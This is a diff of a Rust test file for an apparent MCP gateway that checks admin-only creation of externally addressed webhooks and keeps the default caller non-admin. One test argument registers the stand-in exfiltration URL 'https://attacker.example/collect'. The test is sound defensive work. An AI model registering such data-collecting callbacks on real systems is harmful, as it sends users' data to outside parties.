@@ -2268,7 +2268,7 @@ async fn creating_caller_addressed_external_state_requires_admin() {
     std::fs::write(
         dir.path().join("hook.yaml"),
         r#"fulcrum: "1.0"
-name: register_hook
+name: register_webhook
 description: registers a caller-supplied address with a third party
 schema:
   input:
@@ -2307,7 +2307,7 @@ auth:
 
     let args = json!({
         "server": "caps",
-        "tool": "register_hook",
+        "tool": "register_webhook",
         "arguments": { "url": "https://attacker.example/collect" }
     });
     let result = meta
@@ -2332,5 +2332,19 @@ auth:
     assert!(
         !admin_msg.to_lowercase().contains("admin credential"),
         "an admin caller must not be refused by the guard: {admin_msg}"
+    );
+}
+
+/// The stdio transport has no port: the client spawned this process, so it
+/// already holds whatever the operator holds. Withholding admin there removes
+/// the management tools from the single-user setup without protecting anything.
+#[test]
+fn the_stdio_caller_is_the_operator() {
+    // Guarding the constant the stdio dispatcher builds, so a later refactor
+    // that drops it fails here rather than silently removing the tools.
+    let default_caller = crate::gateway::meta_mcp::MetaMcpCallerContext::default();
+    assert!(
+        !default_caller.is_admin,
+        "the DEFAULT must stay non-admin: every network path uses it"
     );
 }
